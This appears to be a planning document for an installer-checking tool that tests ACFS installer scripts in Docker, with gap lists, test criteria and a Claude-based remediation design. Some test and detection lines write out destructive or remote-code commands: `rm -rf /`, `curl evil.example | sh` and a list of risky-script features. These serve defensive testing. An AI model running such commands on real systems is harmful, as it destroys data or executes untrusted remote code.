**Target state:** modes `off | advisory | propose | apply` from `Settings.remediation.mode`, CLI
`--remediate[=mode]` (bare flag means advisory). Claude CLI 2.x flags used: `--permission-mode plan`,
`--tools`, `--max-turns`, `--max-budget-usd`, `--output-format json`, `--json-schema`.

- **C12a Deterministic checksum refresh (no LLM).** For `checksum_mismatch` results and for
  `validate --check-hashes` drift: download, hash, build a candidate `checksums.yaml` in the ACFS format
  (timestamp header, sorted entries), verify each changed installer by running it through the Docker executor
  with the new hash, and in `propose` mode write the candidate to a git worktree branch
  `afsc/checksum-refresh-<date>` and run `gh pr create` when `create_pr`; `apply` commits to that branch
  (never to main). Advisory prints the unified diff. New subcommand `remediate checksums [--propose|--apply]`.
  Rationale: 7 of 48 drifts today are exactly this case and need no model.
- **C12b Claude advisory.** `claude --print --output-format json --permission-mode plan --tools
  Read,Grep,Glob --max-turns <n> --max-budget-usd <cost_limit> -p <prompt>`; parse the envelope (`result`,
  `total_cost_usd`, `is_error`, `num_turns`, `session_id`); store `remediation: {mode, suggestion, cost_usd,
  model, session_id}` in the result and the run file; run `is_command_safe` over fenced shell blocks in the
  suggestion and annotate each with its risk level; never write to the filesystem.
- **C12c Claude propose and apply.** Run in a fresh `git worktree` of the ACFS repo with
  `--permission-mode acceptEdits --tools Read,Grep,Glob,Edit,Write,Bash --add-dir <worktree>`; after the run,
  diff policy: only `checksums.yaml`, the `KNOWN_INSTALLERS` block in `scripts/lib/security.sh`, and
  `scripts/generated/**` (via `bun run generate`) may change, otherwise reject; verification re-runs the
  failing installer through the Docker executor against the worktree's `checksums.yaml`; on pass and
  `create_pr` open a PR from the branch; on failure discard the worktree and report. `apply` additionally
  commits (branch only). Circuit breaker, rate limiter, `max_attempts`, and cost accounting from the envelope
  are kept; `cost_limit_usd` from config.
- **C12d Honest reporting.** `RemediationOutcome { NotAttempted, Advised, Proposed{pr_url}, Applied{sha},
  Verified, Failed{reason}, Skipped{reason} }` persisted per result; "succeeded" appears only for
  `Verified`; metrics `remediations_total` and `remediations_verified`.
- **C12e Tests.** Check in `tests/fixtures/bin/claude` (scenario selected by `AFSC_FAKE_CLAUDE=success|
  unsafe|error|rate_limit|timeout|edits_out_of_policy`); CLI tests for every mode and scenario; Docker test for
  the verification loop; unit tests for envelope parsing, diff policy, candidate file generation.
**Success criteria:**
- [ ] With the fake claude returning `rm -rf /`, advisory prints the suggestion flagged Critical and the
      result is `Advised`, never "succeeded"; cost equals the envelope value.
- [ ] `remediate checksums --propose` on a drifted fixture produces a branch whose `checksums.yaml` verifies
      in Docker and a PR body listing installers, old and new hashes.
- [ ] Propose mode rejects a worktree diff touching any file outside policy.
- [ ] `[remediation].enabled = false` (default) and no `--remediate` flag means no claude invocation.
**Dependencies:** C1, C4, C5, C10 (executor reuse for verification). **Complexity:** XL (split as above).
**Vision goals served:** 6.

#### Gap C13: Systemd deployment that starts — BROKEN → WORKING

**Current state:** units pass `--all --json` (rejected by clap) and `--priority emergency` (no such flag);
`Environment=NOTIFY_SOCKET=/run/flywheel-checker/notify.sock` points at nothing (READY/STOPPING fail);
`ProtectHome=read-only` blocks `~/.local/share/afsc`; `WorkingDirectory` is the ACFS repo;
`IOReadBandwidthMax=/dev/sda` assumes a device; `notify-flywheel-failure.sh` parses nonexistent keys and
always exits "disabled"; the logrotate config rotates `/var/log/flywheel-checker/*.jsonl` that nothing writes;
never installed anywhere.
**Target state:** `install-systemd.sh` renders units from `systemd/*.service.in` templates with the real
binary path (`/usr/local/bin/automated_flywheel_setup_checker`), user, and data dir; main service:
`ExecStart=… --config /etc/flywheel-checker/config.toml --format json --watchdog check`, `Type=notify`,
`WatchdogSec=300`, `TimeoutStopSec=60` (allows container cleanup), `SupplementaryGroups=docker`,
`WorkingDirectory=/var/lib/flywheel-checker`, `ReadWritePaths=/var/lib/flywheel-checker
/var/log/flywheel-checker`, no `Environment=NOTIFY_SOCKET`, no device-pinned IO limits; emergency unit uses
the same ExecStart with `--parallel 4`; new `automated-flywheel-checker-serve.service` (long-running
`serve`); `ExecStopPost` calls the built-in `notify --last-run` (M5) instead of the bash script; the bash
script is deleted; logrotate paths match `general.log_dir` (M7); `install-systemd.sh --dry-run` prints
rendered units; `systemd-analyze verify` runs when available.
**Success criteria:**
- [ ] `tests/cli/systemd_units.rs`: every rendered `ExecStart` parses with `Cli::try_parse_from`.
- [ ] Bash E2E (M8): `install-systemd.sh --dry-run` renders without error; `systemd-analyze verify` clean.
- [ ] Manual: on a host with Docker, `systemctl start automated-flywheel-checker.service` completes a run,
      results appear in `/var/lib/flywheel-checker/results`, `journalctl` shows READY and STOPPING.
**Implementation plan:** templates, install script, delete `scripts/notify-flywheel-failure.sh`, README
deployment section, `general.data_dir` (C5).
**Dependencies:** C5, C7, M5, M7. **Complexity:** M. **Vision goals served:** 11, 12.

#### Gap C14: CI green: dependency advisories and currency — REGRESSED → WORKING

**Current state:** Security Audit job fails on 8 advisories (bytes 1.11.0, quinn-proto 0.11.13,
rustls-webpki 0.103.9, time, plus anyhow/rand/number_prefix warnings); `cargo update --dry-run` shows
compatible fixes. Direct deps lag: bollard 0.16 (latest 0.21.1), reqwest 0.12 (0.13.4), hyper 1.8 (1.11),
clap 4.5 (4.6).
**Target state:** `cargo update` clears all advisories; a second bead bumps bollard to 0.21 (API changes in
container and exec option types) and reqwest to 0.13 with the Docker tests as the safety net; audit job stays
blocking; a monthly deps-update bead or Dependabot config keeps it green.
**Success criteria:**
- [ ] `cargo audit` exits 0; full suite green on both OSes.
- [ ] Docker tests green after the bollard bump.
**Dependencies:** none (bump depends on C9). **Complexity:** S + M. **Vision goals served:** 18.

### 4.3 Major gaps (significantly degrade the vision)

#### Gap M1: Execution fidelity to ACFS — PARTIAL → WORKING

**Current state:** `bash -s -- <flags> < file` via stdin with args only for rust (`executor.rs:130-145`).
ACFS (`scripts/lib/security.sh:1721-1780`) runs `"$runner_bin" "$staged_file" "${args[@]}"` as the target
user, with `sh` for zoxide, atuin, uv, rust, ohmyzsh; args `--unattended --keep-zshrc` (ohmyzsh), `latest`
(claude), `-y` (rust); env `ATUIN_NO_MODIFY_PATH=1`; some agents installers receive a runner from
`agents.sh:673`.
**Target state:** `src/runner/acfs_profile.rs` holds a built-in table (interpreter, args, env, timeout,
`expect_binary`) per installer, mirroring ACFS call sites; execution is `<interpreter> /tmp/installer_<name>.sh
<args>` on a `chmod 0444` staged file; `[installers.<name>]` overrides win; a drift test parses
`fetch_and_run_with_runner` call sites in the ACFS repo when `AFSC_ACFS_REPO` is set and fails on missing
installers or argument mismatches; `validate --profile` prints the same diff for operators.
**Success criteria:**
- [ ] Unit: profile lookup for ohmyzsh yields `sh` and `--unattended --keep-zshrc`; unknown installer yields
      the default `bash` profile.
- [ ] Drift test passes against the current ACFS checkout; deliberately editing the table fails it.
- [ ] Docker: ohmyzsh, atuin, claude, rust pass or fail for the same reason as under ACFS (baseline, C10).
**Dependencies:** M2. **Complexity:** M. **Vision goals served:** 20.

#### Gap M2: Per-installer overrides — NOT_STARTED → WORKING

**Current state:** `mdwb` timeout floor hardcoded in `main.rs:176-181`; no way to skip an installer, extend a
timeout, add args, or declare an expected binary without editing code.
**Target state:** `[installers.<name>]` with `timeout_seconds`, `retry`, `interpreter`, `args`, `env`, `skip`,
`skip_reason`, `expect_binary`, `run_as_root`; `list` shows overrides; `--dry-run` shows the resolved spec.
**Success criteria:** unit parse tests; CLI test that `skip = true` yields status Skipped with the reason;
`expect_binary` failing yields category `post_install` (opt-in check runs `command -v` in the container).
**Dependencies:** C5. **Complexity:** S. **Vision goals served:** 20, 3.

#### Gap M3: Base image lifecycle — PARTIAL → WORKING

**Current state:** `afsc-base:latest` built once by `docker build` via the deprecated legacy builder; never
rebuilt when `Dockerfile.base` changes; package list copied by hand from an ACFS `install.sh` line reference
that no longer exists (ACFS now defines the list in `scripts/generated/install_base.sh:381`); build timeout
coupled to `--timeout`.
**Target state:** images tagged `afsc-base:<dockerfile-sha12>` with `latest` as an alias; rebuild when the hash
changes or `check --rebuild-base`; build through BuildKit (`docker buildx build`) or Bollard's build API with a
tar context; `docker.build_timeout_seconds`; drift test comparing the Dockerfile apt list with the ACFS
`install_base.sh` list (superset allowed, missing packages fail); README documents the 2 GB image and disk
needs.
**Success criteria:** Docker test: editing the Dockerfile changes the tag and triggers a rebuild; drift test
green against current ACFS.
**Dependencies:** C5. **Complexity:** M. **Vision goals served:** 1.

#### Gap M4: Infrastructure errors and exit codes — PARTIAL → WORKING

**Current state:** with no daemon the error reads "Failed to build afsc-base image: DEPRECATED …";
`ContainerManager::new` can panic; `cmd_check` and `cmd_validate` call `std::process::exit`, skipping watchdog
STOPPING; exit codes are undocumented.
**Target state:** preflight `docker.ping()` before any container work → exit 3 with "Docker daemon unreachable
at <endpoint>: <cause>. Start Docker or use --local"; missing checksums → exit 2 with the path and the config
key; handlers return typed errors mapped to the exit-code policy in `main`; README exit-code table; watchdog
READY after preflight.
**Success criteria:** CLI tests for each exit code; `DOCKER_HOST=unix:///nope` yields exit 3 and the message.
**Dependencies:** C7 (`try_new`). **Complexity:** S. **Vision goals served:** 22, 11.

#### Gap M5: Notifications hardened — WORKING → WORKING+

**Current state:** Slack works; category always "unknown"; GitHub creates a new issue on every failing run
(`add_comments` unused); no per-installer detail; no way to re-send for the last run.
**Target state:** categories from C1; GitHub dedup: search open issues with label `afsc-automated` and the
title prefix, comment instead of creating, close when a later run is clean; Slack blocks list failures with
category and duration; `notify --last-run [--run <id>]` subcommand for `ExecStopPost`; wiremock-backed tests
for both channels; secrets never logged.
**Success criteria:** CLI tests: failing run → POST to fake Slack and fake GitHub search+create; second failing
run → comment not create; clean run → close.
**Dependencies:** C1, C4. **Complexity:** M. **Vision goals served:** 15.

#### Gap M6: Metrics and health that reflect reality — WORKING → WORKING+

**Current state:** `MetricsSnapshot` is a counter file reset when older than 24 h, not a rolling window;
`/health` is "ok" forever after one run; no per-installer metrics; HashMap ordering.
**Target state:** metrics computed from persisted runs within the last 24 h (true rolling window) both at
persist time and on `serve` requests; new gauges `afsc_installer_status{installer}`,
`afsc_installer_duration_seconds{installer}`, `afsc_run_last_timestamp`, `afsc_checksum_drift_total`;
`/health` returns `status: stale` and HTTP 503 when the last run is older than
`monitoring.stale_after_seconds` (default 26 h); BTreeMap ordering; `serve` reads `general.data_dir`;
`monitoring.bind` address.
**Success criteria:** unit tests for window math; CLI `serve` test asserts 503 on stale data and per-installer
lines after a run.
**Dependencies:** C4, C5. **Complexity:** M. **Vision goals served:** 9, 10.

#### Gap M7: Structured log file with rotation — STUB → WORKING

**Current state:** `JsonlReporter`, `LogRotation`, `LogEntry` exist and are unit-tested but nothing writes them;
the systemd logrotate config rotates files nothing creates.
**Target state:** `general.log_dir` (default `<data_dir>/logs`), daily `checker_<date>.jsonl` with events
`run_started`, `installer_started`, `attempt_finished`, `installer_finished`, `run_finished`,
`remediation`, `notification`; retention via `LogRotation`; `--log-format json` mirrors to stderr;
logrotate config aligned with the real paths.
**Success criteria:** CLI test: after a run, the log file exists with one `run_finished` event per run; prune
deletes only files older than retention.
**Dependencies:** C2, C5. **Complexity:** M. **Vision goals served:** 7, 11.

#### Gap M8: Bash E2E suite that tests the product — NOT_STARTED → WORKING

**Current state:** 16 of 18 scripts never invoke the checker with a real command; `helpers.sh:99-122` emits the
obsolete checksums format; tests "pass" by asserting on text they wrote.
**Target state:** every script drives the binary: `single_installer` (file fixture, `check --local`, asserts
pass and verified checksum), `checksum_mismatch` (exit 1, category), `parallel_execution` (four sleepers,
`--parallel 4`, wall time under the sum), `systemd_integration` (rendered units parse, `systemd-analyze
verify`), `remediation_flow` (fake claude, advisory), `github_notification` (local receiver), `config_override`
(precedence), `error_classification` (`classify-error` over the fixture corpus), `jsonl_output` (`jq` parse
of every line), `network_failure` (unreachable URL, retries recorded), `recovery_rollback` (SIGTERM then
reaper), `container_timeout_handling` (Docker timeout), `out_of_memory_scenario` (64 MB limit and a memory hog
→ category `resource`), `disk_space_exhaustion` (small tmpfs), `network_partition_scenario` (skip overrides),
`batch_run`, `metrics_persistence` (kept), `real_installer_run` (C10). Docker-requiring scripts report SKIP as
skipped, not passed, when Docker is absent.
**Success criteria:** `./scripts/e2e/run_all_tests.sh` passes on a Docker host; each script fails when the
corresponding feature is broken (verify by temporarily reverting C1 or C2 locally).
**Dependencies:** C8 fixtures, C7, M2. **Complexity:** L. **Vision goals served:** 19.

#### Gap M9: checksums.yaml integrity against ACFS — PARTIAL → WORKING

**Current state:** `validate` checks URL syntax, presence, reachability, and hashes; it does not check that
`checksums.yaml` and `KNOWN_INSTALLERS` in `scripts/lib/security.sh` agree.
**Target state:** `validate` parses `KNOWN_INSTALLERS` from the ACFS repo and reports missing entries, extra
entries, and URL mismatches as errors; `--check-hashes --emit-candidate <path>` writes a regenerated file in
the ACFS format; distinct exit codes (2 format error, 4 drift).
**Success criteria:** CLI tests with a synthetic `security.sh` fixture.
**Dependencies:** C2. **Complexity:** S. **Vision goals served:** 13.

#### Gap M10: CI hygiene — PARTIAL → WORKING

**Current state:** smoke step writes a fixture then ignores it (`--config /dev/null`) and hides failure with
`|| true`; E2E workflow uses an unused dind service and non-blocking Docker tests; no CLI-test job.
**Target state:** smoke runs `check --local` against the fixture through a real config and must pass; CLI
tests (C8) run on both OSes; Docker tests (C9) blocking on ubuntu-latest with image cache; `cargo audit`
blocking; the E2E workflow no longer path-filters out `docker/**` and `systemd/**`.
**Success criteria:** a deliberately broken `check` fails CI.
**Dependencies:** C8, C9. **Complexity:** S. **Vision goals served:** 19.

#### Gap M11: Fail-fast semantics — PARTIAL → WORKING

**Current state:** parallel fail-fast only skips not-yet-started tests; in-flight ones run to completion;
sequential fail-fast works; `execution.fail_fast` ignored.
**Target state:** first failure cancels the token; in-flight containers are stopped and marked Cancelled,
queued marked Skipped; setting comes from `Settings`; documented.
**Success criteria:** CLI test with four slow fixtures and one fast failure: total wall time under 3 s and
statuses are one Failed, three Cancelled or Skipped.
**Dependencies:** C5, C7. **Complexity:** S. **Vision goals served:** 4.

#### Gap M12: Documentation derived from truth — STALE → WORKING

**Current state:** README claims 41 installers (48), 366 tests (391), `ubuntu:22.04` default, 6 categories
(10), a `--tag essential` example that returns nothing, remediation safety checks, a troubleshooting message
that does not occur; CHANGELOG stops at 2026-01-27; architecture diagram omits `serve`.
**Target state:** README rewritten to actual behavior: installer count phrased as "every entry in ACFS's
checksums.yaml (48 at the time of writing)", test count removed, default image, the ten category names with
suggestions, full config reference including partial-section behavior and `[installers.<name>]`, exit codes,
data dir, remediation modes, systemd installation, troubleshooting messages copied from the code,
limitations updated; CHANGELOG regenerated from git; `docs/baseline/` linked. Doc-drift tests: category
table equals classifier categories; every README CLI example parses with clap; config block equals
`Config::default()` serialization.
**Success criteria:** the three drift tests pass; a reviewer can run every README example verbatim.
**Dependencies:** all other gaps (last). **Complexity:** M. **Vision goals served:** 17.

#### Gap M13: Toolchain and release — REGRESSED → WORKING

**Current state:** nightly required only for `-Z threads=4` in `.cargo/config.toml`; no tags or releases;
`cargo install --git` never tested; the CI build matrix uploads binaries that nobody publishes.
**Target state:** code builds on stable (move the `-Z` flag to an opt-in `RUSTFLAGS` note in README, keep the
nightly toolchain file for dev speed if desired); CI adds a stable build job; `v0.1.0` tag and a release
workflow that attaches the four binaries; `cargo install --git` smoke test on stable in CI.
**Success criteria:** stable job green; release assets present; install smoke passes.
**Dependencies:** C14. **Complexity:** S. **Vision goals served:** 18.

#### Gap M14: Local backend safety — WORKING → WORKING+

**Current state:** `--local` executes upstream scripts on the host with a temp HOME and minimal PATH; no
warning; README calls it "less isolation".
**Target state:** prominent WARN naming the host risk; in non-TTY contexts require `AFSC_ALLOW_LOCAL=1` or
`--local --yes`; README limitation reworded; the temp HOME, XDG dirs, and PATH sandbox documented.
**Success criteria:** CLI test that `--local` without consent in non-TTY exits 2 with the message.
**Dependencies:** none. **Complexity:** S. **Vision goals served:** 1.

### 4.4 Minor gaps (polish and completeness)

- **m1 `--dry-run` shows the resolved spec** (installer, interpreter, args, image, user, timeout, retries,
  hash present, overrides source). Depends M1, M2. S. Goal 20.
- **m2 `list` flags.** Remove `--tag` and `--enabled-only` or map them to `[installers.<name>].skip`; README
  example fixed. S. Goal 16.
- **m3 URL check robustness.** On HTTP 405 or 403 to HEAD, retry with a ranged GET; treat 2xx/3xx-final as
  reachable; single JSON document (C2). S. Goal 13.
- **m4 Dead code wired or deleted.** `validate_checksums(_, check_urls)` sync branch; `runner/retry.rs`
  (wired by C3); `SummaryGenerator`/`RunSummary` unified with the persisted summary; `ParsedError`;
  `fallback::generate_suggestions` (used by advisory mode); `RemediationHealth` exposed via
  `status --detailed`; `LogEntry` (M7). Clippy `dead_code` allowances removed. S/M. Goals 3, 6, 7.
- **m5 Deterministic Prometheus ordering** (folded into M6). S. Goal 10.
- **m6 `.beads/.gitignore`** adds `beads.db-fsqlite-*`, `.br_recovery/`, `*.fsqlite-migration-state`. S.
- **m7 `--version`** prints git sha and build date (`vergen` or a build script). S. Goal 18.
- **m8 `serve` extras.** `HEAD` support, `monitoring.bind`, `Cache-Control: no-store`. S. Goal 9.
- **m9 Output caps.** Cap captured stdout and stderr at `execution.max_capture_bytes` (default 4 MB) with a
  truncation marker, in both backends, so a chatty installer cannot exhaust memory. S. Goals 1, 21.

### 4.5 Dependency graph and waves

Text form (arrow means "must land before"):

```
C14 ──────────────────────────────────────────────► C11, M13
C5 ─┬─► C6 ─► C9 ─► C10 ─► C11
    ├─► M2 ─► M1 ─┘   ▲
    ├─► M3 ─► C6      │
    ├─► M6, M7, M11, C13
    └─► C12 (also needs C1, C4, C10)
C1 ─┬─► C4 ─► M5, M6, C12
C3 ─┘
C2 ────► M7, M9, C11
C7 ────► C9, M4, M11, C13
C8 ────► M8, M10 ; C9 ─► M10
{everything} ─► M12
```

Waves for a swarm (beads inside a wave are independent unless noted):

| Wave | Beads | Why this order |
|------|-------|----------------|
| 0 | C14 (update only), M10 smoke fix, m6 | Turn CI green in an afternoon so every later PR has a signal. |
| 1 | C1, C2, C3, C4, C5, C7, M4, m9 | Core-loop correctness; all small to medium; all independent except C4 after C1/C3. |
| 2 | C6, M2, M1, M3, M9, M14, m1, m2, m3 | Fidelity and configuration; needs C5. |
| 3 | C8, C9, M8, M11, C10 | Proof; C8 tests can be authored during wave 1 and un-ignored here. |
| 4 | M5, M6, M7, C13 | Reporting and deployment; needs C4, C5, C7. |
| 5 | C12a, C12b, C12c, C12d, C12e | Remediation; C12a can start after C4/C10, the Claude pieces after C12a. |
| 6 | C11, M12, M13, m4, m7, m8, C14 major bumps, final integration bead | Canary, docs, release; the final integration bead runs section 4.6 end to end and records the result. |

### 4.6 Verification plan (run after all bridge work; this becomes the "final integration" bead)

| Vision goal | How to prove it |
|-------------|-----------------|
| 1 Docker isolation, any base image, non-root | `check zoxide srps` with `docker.image = "ubuntu:24.04"`: both pass; run header shows user `afsc-user`; `docker ps -a` empty afterwards. |
| 2 Checksum gate | Docker test: drifted fixture exits 99, never executes; failed-but-verified fixture shows `checksum.state == verified`. |
| 3 Classification | CLI: five fixture categories appear in JSONL, `status`, Slack payload. |
| 4 Parallel | CLI: overlapping `started_at` with `execution.parallel = 4` from config only. |
| 5 Retry | CLI: flaky fixture yields three attempts recorded with waits. |
| 6 Remediation | Fake-claude scenarios for all four modes; `remediate checksums --propose` on a drift fixture yields a verified branch and PR body. |
| 7 JSON/JSONL | `jq` parses stdout for every command and format with `-vvv` and failures present. |
| 8 Persistence and status | Two runs in one second both listed; `status --run` works; retention prunes only result files. |
| 9, 10 Monitoring | `serve`: 200 with per-installer gauges after a run; 503 `stale` after the window; `status --format prometheus` deterministic. |
| 11, 12 Systemd | Rendered units parse via clap; `systemd-analyze verify` clean; manual start on a Docker host writes results under `/var/lib/flywheel-checker` and logs READY/STOPPING; timer schedules. |
| 13 Validation | `validate --check-urls --check-hashes --format json` is one document; KNOWN_INSTALLERS cross-check flags a synthetic mismatch; exit 4 on drift. |
| 14 Config | Precedence matrix; partial sections; `config show --resolved`. |
| 15 Notifications | wiremock: create, then comment, then close. |
| 16 list | No dead flags; overrides shown. |
| 17 Docs | Three drift tests green; README examples run verbatim. |
| 18 CI/release | Audit green; stable build; `v0.1.0` assets; `cargo install --git` smoke. |
| 19 Tests | CLI suite ≥ 60 tests; Docker suite blocking; bash suite fails when a feature is broken. |
| 20 Fidelity | Profile drift test green against ACFS; baseline document for all 48 installers committed. |
| 21 Lifecycle | SIGTERM test leaves no containers; reaper removes a labeled orphan only. |
| 22 Infra UX | `DOCKER_HOST=unix:///nope check zoxide` exits 3 with the documented message. |

### 4.7 Decisions for the owner (steering inputs before Phase 3a)

1. **Remediation scope.** Ship `advisory` plus deterministic checksum refresh only (C12a, C12b, C12d, C12e) and
   defer `propose`/`apply` (C12c), or build all four modes. Recommendation: ship advisory plus checksum
   refresh first; it removes the unsafe path immediately and covers the most common failure.
2. **Bash E2E suite.** Rewrite all 16 scripts (M8) or retire the behavior tests into the Rust CLI suite (C8)
   and keep bash only for deployment checks. Recommendation: rewrite, because README advertises the runner and
   it doubles as operator documentation; the Rust suite is the primary gate either way.
3. **Toolchain.** Keep nightly for local build speed but make stable the CI baseline (M13), or drop nightly
   entirely. Recommendation: stable baseline, nightly optional.
4. **Deployment target.** Systemd on the same box as ACFS (`/var/lib/flywheel-checker`, docker group), or
   GitHub Actions nightly only. Recommendation: both, since C11 is cheap and C13 is what the README sells.
5. **Nightly scope.** All 48 installers daily (about 20 to 40 minutes at `--parallel 4`) or a subset.
   Recommendation: all, with `workflow_dispatch` filters.
6. **Multi-Ubuntu matrix.** Included at no extra cost by C6 (`docker.image` list); decide whether the canary runs
   22.04 and 24.04.

### 4.8 Risks and mitigations

- **Bollard 0.21 API churn** (C14 major bump): isolate behind `container.rs`; do the bump after C9 exists.
- **Installer side effects inside `afsc-base`** (network calls, sudo): containers are ephemeral; the memory cap
  and `--parallel` bound the blast radius; add `docker.network = "none"` support for offline-capable installers
  as a later option.
- **Flaky upstreams in the nightly canary**: retries plus the rolling issue (not one issue per run) keep noise
  low; category `network` failures are reported separately from drift.
- **Fake-claude drift from the real CLI**: pin the envelope shape in a fixture generated from a real
  `claude --print --output-format json` run and re-validate quarterly.
- **Disk pressure on hosts** (this box sits at 97%): document image sizes; `check --reap` and result retention
  keep growth bounded.

### 4.9 Ambition round 1: beyond the README (what a canary for supply-chain-sensitive installers must do)

The README describes a checker. ACFS's fail-closed checksum policy exists because `curl | bash` installers
are a supply-chain surface. A tool that only says "hash changed" leaves the hard question (is this change
legitimate?) to a human with no evidence. Round 1 adds the capabilities that make the tool decisive.

#### Gap A1: Script provenance ledger and drift diff with risk scoring — NOT_STARTED → WORKING

**Current state:** on drift the tool reports two hashes. Nothing stores what the script used to be.
**Target state:** every verified script is stored content-addressed under `<data_dir>/scripts/<installer>/
<sha256>.sh` with a small index (first seen, last verified pass, run ids). On drift (`validate --check-hashes`,
`check`, `remediate checksums`), the tool renders a unified diff between the last verified-pass script and the
new one and a risk report computed from the diff: added network destinations (new hosts or URLs), changed
download URLs or version pins, added `sudo`, `rm -rf`, `chmod 777`, `eval`, `base64 -d`, `curl … | sh`
nesting, added lines with high Shannon entropy (opaque blobs), size delta, and whether the change is confined
to version strings. Output: a score (`routine | review | suspicious`) with the triggering features listed,
in human, JSON, markdown (for the canary issue), and in the notification body. This is what lets a reviewer
approve the deterministic checksum refresh (C12a) with evidence.
**Success criteria:** unit tests with synthetic before/after scripts for each feature; a version-bump-only
diff scores `routine`; an added `curl evil.example | sh` scores `suspicious`; ledger survives retention
pruning (scripts are small; keep the last 5 per installer).
**Dependencies:** C4 (data dir, run header), C12a (consumer). **Complexity:** M. **Vision goals served:** 2,
6, 13.

#### Gap A2: Post-install verification and installed-version capture — PARTIAL → WORKING

**Current state:** README lists "no post-install validation" as a limitation; M2 adds `expect_binary`.
**Target state:** `[installers.<name>]` gains `verify_cmd` (run in the container after a passing install,
non-zero → category `post_install`) and `version_cmd` (its first line is stored as `installed_version` in the
result). Built-in profile defaults for the obvious cases (`zoxide --version`, `bun --version`,
`uv --version`, `cargo --version` after rust, `claude --version`, `node --version` after nvm). The baseline
document (C10b) and `status --history` (A8) show version timelines, so "bun 1.2.3 → 1.2.4 on 2026-09-07"
becomes visible without reading logs.
**Success criteria:** Docker test: zoxide result carries `installed_version` matching `zoxide --version`; a
failing `verify_cmd` yields `post_install`.
**Dependencies:** M2, C4. **Complexity:** S. **Vision goals served:** 3, 20.

#### Gap A3: `doctor` command — NOT_STARTED → WORKING

**Current state:** the README troubleshooting section lists four symptoms; the tool cannot diagnose its own
environment.
**Target state:** `doctor [--format json]` checks and reports (pass/warn/fail with a fix hint): Docker
reachable and version; prepared image present and its age; ACFS repo path and `checksums.yaml` parse;
`KNOWN_INSTALLERS` cross-check summary; data dir and log dir writable; free disk on the Docker root and the
data dir; `claude` and `gh` presence and versions (only when remediation or notifications need them);
notification env vars set (names only); systemd units rendered and installed (when the install path exists);
config unknown keys; last run age; leaked `afsc.managed` containers. Exit 0 when nothing failed. Same output
also embedded in the run header as `environment` (abridged) for reproducibility.
**Success criteria:** CLI tests for each check with the environment manipulated; `doctor --format json` is one
document; README troubleshooting section points at it.
**Dependencies:** C5, C7. **Complexity:** M. **Vision goals served:** 22, 17.

#### Gap A4: Container resource telemetry — NOT_STARTED → WORKING

**Current state:** results record duration only; memory limits are guessed.
**Target state:** after each attempt the executor reads Docker stats (one-shot `stats` call before cleanup)
and records `peak_memory_bytes`, `cpu_seconds`, `net_rx_bytes`, `net_tx_bytes` on the result; `status
--detailed` and the baseline show them; Prometheus gains `afsc_installer_peak_memory_bytes`; M2 can set
per-installer `memory_limit` with evidence.
**Success criteria:** Docker test: a memory-hog fixture reports peak memory above 100 MiB; a trivial fixture
below 50 MiB.
**Dependencies:** C4. **Complexity:** S. **Vision goals served:** 1, 9.

#### Gap A5: Concurrency safety across processes — NOT_STARTED → WORKING

**Current state:** the base-image build lock is in-process only; `metrics.json` is read-modify-write with no
lock; two `check` processes (systemd timer plus a manual run) can interleave.
**Target state:** a file lock at `<data_dir>/locks/run.lock` taken by `check` (fail fast with exit 3 and a
message naming the other pid unless `--allow-concurrent`), a separate lock for image builds, and atomic
writes (temp file + rename) for `metrics.json` and the ledger index. `serve` never takes the run lock.
**Success criteria:** CLI test: two concurrent `check` invocations, the second exits 3 immediately; with
`--allow-concurrent` both complete and both result files exist.
**Dependencies:** C4, C5. **Complexity:** S. **Vision goals served:** 8, 11.

#### Gap A6: Secret redaction in captures, logs, and notifications — NOT_STARTED → WORKING

**Current state:** installer stdout/stderr are persisted and sent to Slack/GitHub verbatim; an installer
that prints its environment would leak tokens.
**Target state:** a redaction pass over persisted tails, notification bodies, and structured log events using
patterns for GitHub tokens (`ghp_`, `github_pat_`), Slack (`xox[abp]-`), AWS (`AKIA…`), Anthropic/OpenAI
(`sk-…`), generic `token=|password=|secret=` values, and long base64/hex runs following those keys;
replacement `[redacted:<kind>]`; the run header lists env var names passed to containers, never values.
**Success criteria:** unit tests per pattern; CLI test that a fixture printing `GITHUB_TOKEN=ghp_xxx`
persists `[redacted:github_token]`.
**Dependencies:** C4, M5, M7. **Complexity:** S. **Vision goals served:** 7, 15.

#### Gap A7: Run deadline and longest-first scheduling — NOT_STARTED → WORKING

**Current state:** a run has no overall deadline; installers run in HashMap order.
**Target state:** `execution.run_deadline_seconds` (default 0 = none; the systemd config and canary set it)
cancels remaining work at the deadline with status `Cancelled(deadline)`; `execution.order =
longest-first | name | manifest` (default `longest-first` when history exists) orders installers by their
historical median duration descending, the classic LPT heuristic that minimizes makespan for `--parallel N`
(measurably shorter nightly runs when one installer dominates, as `srps` at 110 s does today).
**Success criteria:** unit test of the ordering; CLI test that a 2 s deadline cancels a 10 s fixture with the
right status and exit code.
**Dependencies:** C7, C5, A8 (history). **Complexity:** S. **Vision goals served:** 4, 21.

#### Gap A8: Run history, diffs, rerun-failed, and flakiness detection — NOT_STARTED → WORKING

**Current state:** `status` shows one run; comparing runs means reading files.
**Target state:** `status --history <installer> [--last N]` prints a pass/fail and duration timeline with
installed versions (A2) and script hashes (A1); `status --diff <run-a> <run-b>` lists state changes;
`check --failed-from <run-id|last>` reruns only failures; a flakiness detector marks an installer `flaky`
when its recent pass rate over unchanged script hashes is below a threshold, and `broken since <run>` when a
change-point is detected. Detector: per installer, treat outcomes since the last script change as Bernoulli
trials; a Beta(1,1) posterior on pass probability gives `P(pass) < 0.9` → flaky; a CUSUM over the same series
(fail = +1, pass = −k) crossing a threshold marks the change-point, which is cheap, deterministic, and easy
to explain in the canary issue ("failing 6 of the last 6 runs since run 2026-09-05, script unchanged").
**Success criteria:** unit tests for the detector on synthetic series (stable pass, intermittent, step
change); CLI tests for `--history`, `--diff`, `--failed-from`.
**Dependencies:** C4. **Complexity:** M. **Vision goals served:** 8, 12.

#### Gap A9: Classifier golden corpus and explainability — UNPROVEN → WORKING

**Current state:** classifier tests use eleven hand-written fixtures; real installer output has never been
captured.
**Target state:** the full-catalog run (C10b) and the nightly canary archive stderr/stdout tails of every
failure into `tests/fixtures/error_outputs/real/<installer>-<date>.txt` (redacted, A6) with an expected
category in a table file; table-driven tests; `classify-error --explain` prints the matching pattern and
its position; a precision report (`classify-error --report tests/fixtures/error_outputs`) prints per-category
counts and unknowns so pattern gaps are visible.
**Success criteria:** table-driven test over the corpus; `unknown` rate below 10% on the real corpus.
**Dependencies:** C10b, A6. **Complexity:** S. **Vision goals served:** 3.

#### Gap A10: URL policy and file:// gating — PARTIAL → WORKING

**Current state:** any URL scheme is accepted; `file://` works everywhere (useful for tests, dangerous for a
poisoned checksums.yaml pointing at `http://`).
